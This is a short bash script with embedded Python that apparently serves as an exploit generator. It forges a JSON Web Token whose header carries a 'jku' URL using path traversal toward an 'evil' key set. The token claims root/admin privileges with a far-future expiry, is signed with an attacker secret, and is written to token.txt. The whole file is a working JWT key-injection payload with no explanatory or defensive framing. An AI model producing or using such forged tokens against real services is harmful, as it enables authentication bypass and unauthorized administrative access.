#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
python3 - <<'INNER_PY'
import json,base64,hmac,hashlib,os
from pathlib import Path
def b64(x): return base64.urlsafe_b64encode(x).decode().rstrip('=')
h=b64(json.dumps({'alg':'HS256','typ':'JWT','jku':'https://cdn.example.local/keys/../../evil/jwks.json'},separators=(',',':')).encode())
p=b64(json.dumps({'sub':'root','role':'admin','iat':1,'exp':9999999999},separators=(',',':')).encode())
s=b64(hmac.new(b'evil-secret',(h+'.'+p).encode(),hashlib.sha256).digest())
Path(os.environ['OUT_DIR'],'token.txt').write_text(h+'.'+p+'.'+s+'\n')
INNER_PY
